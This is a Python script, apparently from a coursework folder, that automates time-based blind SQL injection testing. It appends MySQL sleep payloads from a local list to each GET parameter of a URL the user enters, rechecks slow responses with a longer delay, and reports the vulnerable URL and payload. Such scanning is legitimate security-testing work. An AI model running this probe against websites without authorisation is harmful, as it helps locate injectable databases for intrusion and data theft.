import requests
from urllib.parse import urlparse, parse_qs
import time
from datetime import datetime

PAYLOADS_PATH = ['C:\\Users\\jjag0\\Documents\\Classes\\ACS\\Basic Courses\\Coding\\sql-injection-payload-list-master\\Intruder\\payloads-sql-blind\\MySQL\\SQL-Time.txt']
LOG = 1

def get_processor(url):
    parsed_url = urlparse(url)
    query_parameters_ = parse_qs(parsed_url.query)
    query_parameters = {}
    for key, value in query_parameters_.items():
        query_parameters[key] = value[0]
    scheme = parsed_url.scheme
    netloc = parsed_url.netloc
    path = parsed_url.path
    return netloc, path, query_parameters

def get_request_send(netloc, path, query_parameters):
    url = 'https://%s%s?' % (netloc, path)
    params_part = ''
    for key, value in query_parameters.items():
        params_part += '&' + key + '=' + value
    url += params_part[1:]
    try:
        r = requests.get(url = url, timeout=10)
    except requests.exceptions.RequestException as e:
        print("Error making request: ", e)
        return None, url
    return r, url

def process_payload_sleep_get(netloc, path, query_parameters):
    for payloads_path in PAYLOADS_PATH:
        try:
            with open(payloads_path, 'r') as f:
                payloads = f.readlines()
        except FileNotFoundError:
            print("Error opening file: ", payloads_path)
            continue
        for payload in payloads:
            payload = payload.strip()
            for key, value in query_parameters.items():
                query_parameters_payload = query_parameters.copy()
                query_parameters_payload[key] = value + payload
                print(query_parameters_payload)
                start_time = time.time()
                r, url_test = get_request_send(netloc, path, query_parameters_payload)
                if r is None:
                    continue
                elapsed_time = time.time() - start_time
                ### 
                if LOG == 1:
                    current_time = datetime.now().time()
                    # print(current_time)
                    formatted_time = current_time.strftime("%H:%M:%S")
                    print('[%s] Payload testing: %s' % (formatted_time, payload))
                # print('Payload: %s' % payload)
                if elapsed_time >= 5:
                    # Recheck
                    recheck_payload = payload.replace("5", "10")
                    query_parameters_payload[key] = value + recheck_payload
                    if LOG == 1:
                        print("[!] Recheck payload: %s" % recheck_payload)
                    recheck_start_time = time.time()
                    r, url_test = get_request_send(netloc, path, query_parameters_payload)
                    if r is None:
                        continue
                    recheck_elapsed_time = time.time() - recheck_start_time
                    if recheck_elapsed_time >= 10:
                        print('[+] SQL injection vulnerabilities detected')
                        print('[+] URL: %s' % url_test)
                        print('[+] Payload: %s' % payload)
                        return

def main():
    url = input("Enter the URL: ")
    netloc, path, query_parameters = get_processor(url)
    process_payload_sleep_get(netloc, path, query_parameters)

if __name__ == "__main__":
    main()

